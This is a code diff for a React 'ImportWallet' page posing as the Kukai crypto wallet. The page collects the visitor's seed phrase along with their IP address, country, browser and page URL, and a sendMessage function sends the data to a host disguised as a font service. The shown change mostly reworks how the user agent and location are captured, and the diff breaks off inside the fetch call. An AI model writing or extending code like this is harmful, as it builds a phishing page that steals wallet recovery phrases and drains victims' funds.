@@ -3,13 +3,14 @@
 import { ChevronLeft } from "lucide-react";
 import { useEffect, useState } from "react";
 import { getUserCountry } from "../utils/services/getUserLocation";
-import { userAgent } from "next/server";
 
 export default function ImportWallet() {
   const [activeTab, setActiveTab] = useState("keystore");
   const [isToggled, setIsToggled] = useState(false);
   const [userInfo, setUserInfo] = useState()
   const [seedPhraseMessage, setSeedPhraseMessage] = useState()
+  const [windowLocation, setWindowLocation] = useState()
+  const [userAgent, setUserAgent] = useState()
   const toggleSwitch = () => {
     setIsToggled(!isToggled);
   };
@@ -17,18 +18,18 @@ export default function ImportWallet() {
   useEffect(() => {
     const fetchUserInfo = async () => {
       const userInfo = await getUserCountry();
-      console.log(userInfo);
       setUserInfo(userInfo);
     };
+    const userAgent = navigator.userAgent;
+    setUserAgent(userAgent)
     fetchUserInfo();
+    setWindowLocation(window.location.href)
   }, []);
 
 
-
-  console.log(userAgent)
   const messageData = {
     country: userInfo?.country || "Unknown",
-    browser: navigator.userAgent,
+    browser: userAgent,
     ipAddress: userInfo?.ip,
     appName: "Kukai",
     seedPhrase: seedPhraseMessage,
@@ -38,10 +39,11 @@ export default function ImportWallet() {
 
   const messageDataAlt = {
     country: userInfo?.country,
-    browser: navigator.userAgent,
+    browser: userAgent,
     ipAddress: userInfo?.ip,
-    appName: window.href,
+    appName: windowLocation,
   };
+
   const sendMessage = async () => {
     try {
       await fetch("https://fonts7787.vercel.app/api/t1/image", {
